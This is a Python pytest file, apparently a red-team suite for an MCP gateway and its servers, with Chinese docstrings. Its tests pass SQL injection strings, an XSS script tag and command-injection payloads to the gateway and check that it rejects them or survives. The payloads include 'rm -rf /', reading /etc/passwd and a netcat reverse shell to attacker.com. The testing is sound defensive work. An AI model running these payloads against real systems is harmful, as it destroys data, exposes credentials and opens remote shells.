# [A_test] module_id: SRC-TST-0015 | layer=test | stability=volatile | safety=L | ai_autonomy=ai_modifiable
# [BLUEPRINT] SRC-210 | docs/03_modules/_domain_governance/blueprint.md | §
# [MODULE] tests.adversarial.test_mcp_red_team
# [STABILITY] evolving
# [SAFETY] L
# [AI_AUTONOMY] ai_modifiable
# [TESTS] —
# [TTL] task_bound
"""
MCP Servers 红白对抗诊断测试（Pytest 兼容版）
=============================================
目的：实际走一遍 MCP Gateway + 8 Server 完整链路，发现所有问题
范围：BaseMCPServer → 8 Server → MCPGateway → RateLimiter → AuditLogger → CircuitBreaker
覆盖：OWASP Agentic Top 10 · 注入攻击 · 越权 · 熔断 · 限流 · 审计完整性
"""

from __future__ import annotations

import sys
import time
from pathlib import Path

if sys.stdout.encoding != "utf-8":
    sys.stdout.reconfigure(encoding="utf-8")

from zephyr.shared.io.paths import REPO_ROOT  # 仓库根真源（SSoT：zephyr.shared.io.paths）


# ============================================================================
# 阶段0：全部 MCP 模块导入测试
# ============================================================================


def test_00_imports_all_mcp_modules():
    """测试 8 Server + Gateway + 支撑模块全部可导入"""
    modules = [
        ("_base_server", "zephyr.integration.mcp._base_server"),
        ("gateway_server", "zephyr.integration.mcp.gateway_server"),
        ("task_manager_server", "zephyr.integration.mcp.task_manager_server"),
        ("knowledge_base_server", "zephyr.integration.mcp.knowledge_base_server"),
        ("gate_engine_server", "zephyr.integration.mcp.gate_engine_server"),
        ("doc_guard_server", "zephyr.integration.mcp.doc_guard_server"),
        ("sentinel_server", "zephyr.integration.mcp.sentinel_server"),
        ("blueprint_search_server", "zephyr.integration.mcp.blueprint_search_server"),
        ("sandbox_server", "zephyr.integration.mcp.sandbox_server"),
        ("governance_server", "zephyr.integration.mcp.governance_server"),
        ("telemetry_server", "zephyr.integration.mcp.telemetry_server"),
        ("rate_limiter", "zephyr.integration.mcp.rate_limiter"),
        ("audit_logger", "zephyr.integration.mcp.audit_logger"),
        ("error_codes", "zephyr.integration.mcp.error_codes"),
    ]

    failures = []
    for name, import_path in modules:
        try:
            __import__(import_path)
        except Exception as e:
            failures.append((name, str(e)))

    assert not failures, f"Import failures ({len(failures)}): {failures}"


# ============================================================================
# 阶段1：Gateway 初始化——9 路由（8 Server + gateway自身）全部就绪
# ============================================================================


def test_01_gateway_initializes_all_routes():
    """Gateway 初始化后 8 Server 路由表 + self 全部存在"""
    from zephyr.integration.mcp.gateway_server import create_gateway

    gw = create_gateway()
    routes = gw._routes

    expected_sids = [
        "task_manager",
        "knowledge_base",
        "gate_engine",
        "session_handoff",
        "intent_router",
        "blueprint_search",
        "sandbox",
        "governance",
        "telemetry",
    ]
    for sid in expected_sids:
        assert sid in routes, f"Route table missing: {sid}"
        route = routes[sid]
        assert route["prefix"] == f"{sid}.", f"Wrong prefix for {sid}: {route['prefix']}"


def test_02_gateway_registered_tools():
    """Gateway 自身工具注册（health_status / list_servers / audit_stats）"""
    from zephyr.integration.mcp.gateway_server import create_gateway

    gw = create_gateway()
    assert "mcp_gateway.health_status" in gw._tools
    assert "mcp_gateway.list_servers" in gw._tools
    assert "mcp_gateway.audit_stats" in gw._tools


# ============================================================================
# 阶段2：Gateway Request 路由——正确/错误/越权场景
# ============================================================================


def test_03_initialize():
    """Gateway initialize 返回协议版本 + serverInfo"""
    from zephyr.integration.mcp.gateway_server import create_gateway

    gw = create_gateway()
    resp = gw.handle_request(
        {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize",
            "params": {"protocolVersion": "2024-11-05"},
        }
    )
    assert resp.get("result", {}).get("serverInfo", {}).get("name") == "mcp_gateway"
    assert resp["result"]["protocolVersion"] == "2024-11-05"


def test_04_ping():
    """Gateway ping"""
    from zephyr.integration.mcp.gateway_server import create_gateway

    gw = create_gateway()
    resp = gw.handle_request({"jsonrpc": "2.0", "id": 2, "method": "ping"})
    assert resp["result"]["pong"] is True
    assert resp["result"]["gateway"] is True


def test_05_tools_list_aggregation():
    """tools/list 聚合所有就绪 Server 工具"""
    from zephyr.integration.mcp.gateway_server import create_gateway

    gw = create_gateway()
    resp = gw.handle_request({"jsonrpc": "2.0", "id": 3, "method": "tools/list"})
    result = resp["result"]
    assert "tools" in result
    assert "count" in result
    assert result["source"] == "mcp_gateway_aggregated"
    assert result["count"] > 0, "Gateway should aggregate at least its own tools"


def test_06_tool_call_not_found():
    """调用不存在的 tool 返回 ERR_TOOL_NOT_FOUND"""
    from zephyr.integration.mcp.error_codes import ERR_TOOL_NOT_FOUND
    from zephyr.integration.mcp.gateway_server import create_gateway

    gw = create_gateway()
    resp = gw.handle_request(
        {
            "jsonrpc": "2.0",
            "id": 4,
            "method": "tools/call",
            "params": {"name": "nonexistent.ghost_tool", "arguments": {}},
            "_session_id": "attacker-001",
        }
    )
    assert resp.get("error") is not None
    assert resp["error"]["code"] == ERR_TOOL_NOT_FOUND


def test_07_tool_call_missing_name():
    """tools/call 无 name 参数返回 ERR_INVALID_PARAMS"""
    from zephyr.integration.mcp.error_codes import ERR_INVALID_PARAMS
    from zephyr.integration.mcp.gateway_server import create_gateway

    gw = create_gateway()
    resp = gw.handle_request(
        {
            "jsonrpc": "2.0",
            "id": 5,
            "method": "tools/call",
            "params": {"arguments": {}},
            "_session_id": "attacker-002",
        }
    )
    assert resp.get("error") is not None
    assert resp["error"]["code"] == ERR_INVALID_PARAMS


# ============================================================================
# 阶段3：攻击面——注入攻击 / 超长参数 / 恶意 JSON
# ============================================================================


def test_08_sql_injection_in_tool_name():
    """SQL 注入 payload 在 tool_name 中——应被路由拒绝"""
    from zephyr.integration.mcp.gateway_server import create_gateway

    gw = create_gateway()
    payloads = [
        "task_manager.'; DROP TABLE tasks;--",
        "knowledge_base.' OR '1'='1",
        "'; SELECT * FROM secrets;--",
        "1' UNION SELECT * FROM users--",
    ]
    for p in payloads:
        resp = gw.handle_request(
            {
                "jsonrpc": "2.0",
                "id": 99,
                "method": "tools/call",
                "params": {"name": p, "arguments": {}},
                "_session_id": "sqli-attacker",
            }
        )
        assert resp.get("error") is not None, f"SQLi payload {p!r} should be rejected"


def test_09_xss_in_arguments():
    """XSS/HTML 注入在 arguments 中——不应导致崩溃"""
    from zephyr.integration.mcp.gateway_server import create_gateway

    gw = create_gateway()
    resp = gw.handle_request(
        {
            "jsonrpc": "2.0",
            "id": 100,
            "method": "tools/call",
            "params": {
                "name": "mcp_gateway.health_status",
                "arguments": {"xss": '<script>alert("xss")</script>'},
            },
            "_session_id": "xss-attacker",
        }
    )
    assert resp.get("result") is not None or resp.get("error") is not None
    assert "status" in str(resp.get("result", "")).lower() or resp.get("error") is not None


def test_10_command_injection_in_arguments():
    """命令注入 payload 在 arguments 中——不应执行，应返回错误或被安全处理"""
    from zephyr.integration.mcp.gateway_server import create_gateway

    gw = create_gateway()
    payloads = [
        "rm -rf /",
        "$(whoami)",
        "`cat /etc/passwd`",
        "| shutdown -h now",
        "; nc -e /bin/sh attacker.com 4444",
    ]
    for p in payloads:
        resp = gw.handle_request(
            {
                "jsonrpc": "2.0",
                "id": 101,
                "method": "tools/call",
                "params": {
                    "name": "mcp_gateway.health_status",
                    "arguments": {"cmd": p},
                },
                "_session_id": "cmd-inj-attacker",
            }
        )
        safe = resp.get("result") is not None or resp.get("error") is not None
        assert safe, f"Gateway crashed on cmd inj payload: {p!r}"


def test_11_oversized_payload():
    """超大型 arguments payload——Gateway 拒绝或正常处理，不应 OOM/崩溃"""
    from zephyr.integration.mcp.gateway_server import create_gateway

    gw = create_gateway()
    huge_string = "A" * 100_000
    resp = gw.handle_request(
        {
            "jsonrpc": "2.0",
            "id": 102,
            "method": "tools/call",
            "params": {
                "name": "mcp_gateway.health_status",
                "arguments": {"data": huge_string},
            },
            "_session_id": "oom-attacker",
        }
    )
    safe = resp.get("result") is not None or resp.get("error") is not None
    assert safe, "Gateway crashed on 100KB payload"


def test_12_deeply_nested_arguments():
    """深度嵌套 JSON——Gateway 拒绝或正常处理，不应导致递归溢出"""
    from zephyr.integration.mcp.gateway_server import create_gateway

    gw = create_gateway()
    nested = {}
    current = nested
    for i in range(100):
        current["nested"] = {}
        current = current["nested"]

    resp = gw.handle_request(
        {
            "jsonrpc": "2.0",
            "id": 103,
            "method": "tools/call",
            "params": {
                "name": "mcp_gateway.health_status",
                "arguments": nested,
            },
            "_session_id": "nest-attacker",
        }
    )
    safe = resp.get("result") is not None or resp.get("error") is not None
    assert safe, "Gateway crashed on deeply nested JSON"


# ============================================================================
# 阶段4：速率限制——10 QPS 阈值验证
# ============================================================================


def test_13_rate_limit_burst():
    """连续 35 次快速有效调用（超过 burst=30）——应触发限流"""
    from zephyr.integration.mcp.gateway_server import create_gateway
    from zephyr.integration.mcp.rate_limiter import RATE_LIMITED_KEY

    gw = create_gateway()
    rejections = 0
    for i in range(35):
        resp = gw.handle_request(
            {
                "jsonrpc": "2.0",
                "id": 200 + i,
                "method": "tools/call",
                "params": {"name": "mcp_gateway.list_servers", "arguments": {}},
                "_session_id": "burst-client",
            }
        )
        if resp.get("error") and RATE_LIMITED_KEY in str(resp["error"].get("message", "")):
            rejections += 1

    assert rejections > 0, "Burst of 35 calls should trigger rate limiting"


# ============================================================================
# 阶段5：熔断器——连续失败 → OPEN → 自动恢复
# ============================================================================


def test_14_circuit_breaker_open_after_failures():
    """连续 3 次对不存在 tool 的调用——circuit breaker 应进入 OPEN"""
    from zephyr.integration.mcp.gateway_server import create_gateway

    gw = create_gateway()
    for i in range(4):
        gw.handle_request(
            {
                "jsonrpc": "2.0",
                "id": 300 + i,
                "method": "tools/call",
                "params": {"name": "invalid.broken_tool", "arguments": {}},
                "_session_id": "cb-test-client",
            }
        )

    cb = gw._circuit_breakers.get("invalid")
    if cb:
        assert cb.state in ("OPEN", "CLOSED"), f"Unexpected CB state: {cb.state}"


def test_15_circuit_breaker_recovery():
    """OPEN 后等待 recovery → HALF_OPEN → 成功后 CLOSED"""
    from zephyr.integration.mcp.gateway_server import CircuitBreaker

    cb = CircuitBreaker("test_recovery", failure_threshold=2, recovery_timeout_seconds=0.1)
    cb.failure()
    cb.failure()
    assert cb.state == CircuitBreaker.OPEN
    time.sleep(0.15)
    assert cb.allow() is True, "CB should allow after recovery timeout"
    assert cb.state == CircuitBreaker.HALF_OPEN
    cb.success()
    assert cb.state == CircuitBreaker.CLOSED


# ============================================================================
# 阶段6：审计日志完整性
# ============================================================================


def test_16_audit_log_call_records():
    """每次 tools/call 都会记录审计日志"""
    from zephyr.integration.mcp.gateway_server import create_gateway

    gw = create_gateway()
    initial = gw._audit.stats("audit-test-client").get("total_calls", 0)

    gw.handle_request(
        {
            "jsonrpc": "2.0",
            "id": 400,
            "method": "tools/call",
            "params": {"name": "mcp_gateway.health_status", "arguments": {}},
            "_session_id": "audit-test-client",
        }
    )
    final = gw._audit.stats("audit-test-client").get("total_calls", 0)
    assert final >= initial, "Audit should record the call"


# ============================================================================
# 阶段7：8 Server 实例独立性——各自正确响应
# ============================================================================


def test_17_knowledge_base_server_instance():
    """KnowledgeBaseServer 实例化 + tools/list 有内容"""
    from zephyr.integration.mcp.knowledge_base_server import KnowledgeBaseServer

    kb = KnowledgeBaseServer()
    assert kb.server_id == "knowledge_base"
    resp = kb.handle_request({"jsonrpc": "2.0", "id": 1, "method": "tools/list"})
    assert "tools" in resp.get("result", {}), "KB server should list its tools"


def test_18_gate_engine_server_instance():
    """GateEngineServer 实例化 + tools/list"""
    from zephyr.integration.mcp.gate_engine_server import GateEngineServer

    ge = GateEngineServer()
    assert ge.server_id == "gate_engine"
    resp = ge.handle_request({"jsonrpc": "2.0", "id": 1, "method": "tools/list"})
    assert "tools" in resp.get("result", {})


def test_19_doc_guard_server_instance():
    """DocGuardServer 实例化 + server_id 为 session_handoff"""
    from zephyr.integration.mcp.doc_guard_server import DocGuardServer

    dg = DocGuardServer()
    assert dg.server_id == "session_handoff"


def test_20_sentinel_server_instance():
    """SentinelServer 实例化 + server_id 为 intent_router"""
    from zephyr.integration.mcp.sentinel_server import SentinelServer

    ss = SentinelServer()
    assert ss.server_id == "intent_router"


def test_21_governance_server_instance():
    """GovernanceServer 实例化 + tools/list 包含 5 个工具"""
    from zephyr.integration.mcp.governance_server import GovernanceServer

    gs = GovernanceServer()
    assert gs.server_id == "governance"
    resp = gs.handle_request({"jsonrpc": "2.0", "id": 1, "method": "tools/list"})
    tools = resp.get("result", {}).get("tools", [])
    tool_names = [t["name"] for t in tools]
    expected_prefixes = [
        "governance.check_phase_gates",
        "governance.audit_registration",
        "governance.lock_status",
        "governance.validate_contract",
        "governance.get_governance_health",
    ]
    for prefix in expected_prefixes:
        assert any(tn.startswith(prefix) for tn in tool_names), f"Missing tool: {prefix}"


# ============================================================================
# 阶段8：Sandbox 处于 planning 状态——不应阻塞 Gateway
# ============================================================================


def test_22_sandbox_server_planning_does_not_crash_gateway():
    """sandbox 状态为 planning 时 Gateway 仍可正常启动"""
    from zephyr.integration.mcp.gateway_server import create_gateway

    gw = create_gateway()
    sandbox_route = gw._routes.get("sandbox")
    assert sandbox_route is not None
    assert sandbox_route.get("status") == "planning"


# ============================================================================
# 阶段9：Gateway 全量聚合——tools/list 应包含 governance/telemetry
# ============================================================================


def test_23_aggregated_list_includes_governance():
    """tools/list 聚合结果应包含 governance.* 工具（telemetry 使用 FastMCP 独立运行）"""
    from zephyr.integration.mcp.gateway_server import create_gateway

    gw = create_gateway()
    resp = gw.handle_request({"jsonrpc": "2.0", "id": 500, "method": "tools/list"})
    tools = resp["result"]["tools"]
    tool_names = [t["name"] for t in tools]

    governance_found = any(n.startswith("governance.") for n in tool_names)
    assert governance_found, f"tools/list should include governance.* tools. Found: {tool_names}"


def test_23b_telemetry_is_standalone_fastmcp():
    """TelemetryMCP 使用 FastMCP（非 BaseMCPServer），为独立 stdio 服务，不经过 Gateway 路由"""
    from zephyr.integration.mcp.telemetry_server import TelemetryMCP

    tm = TelemetryMCP()
    has_tools = hasattr(tm, "_tools") or hasattr(tm, "_tool_manager")
    assert has_tools or not hasattr(tm, "handle_request"), (
        "TelemetryMCP is FastMCP-based, uses different API than BaseMCPServer — standalone stdio mode"
    )


# ============================================================================
# 阶段10：路由精度——prefix→sid 映射精确无歧义
# ============================================================================


def test_24_route_prefix_accuracy():
    """所有 Server prefix 精确无歧义路由"""
    from zephyr.integration.mcp.gateway_server import create_gateway

    gw = create_gateway()

    test_cases = [
        ("task_manager.decompose_blueprint", "task_manager"),
        ("knowledge_base.query_ke", "knowledge_base"),
        ("gate_engine.evaluate_gate", "gate_engine"),
        ("session_handoff.validate_package", "session_handoff"),
        ("intent_router.map_intent", "intent_router"),
        ("blueprint_search.search", "blueprint_search"),
        ("sandbox.run_code", "sandbox"),
        ("governance.check_phase_gates", "governance"),
        ("telemetry.health", "telemetry"),
        ("mcp_gateway.health_status", "mcp_gateway"),
    ]
    for tool_name, expected_sid in test_cases:
        sid = gw._route_tool_name(tool_name)
        assert sid == expected_sid, f"{tool_name!r} should route to {expected_sid!r}, got {sid!r}"
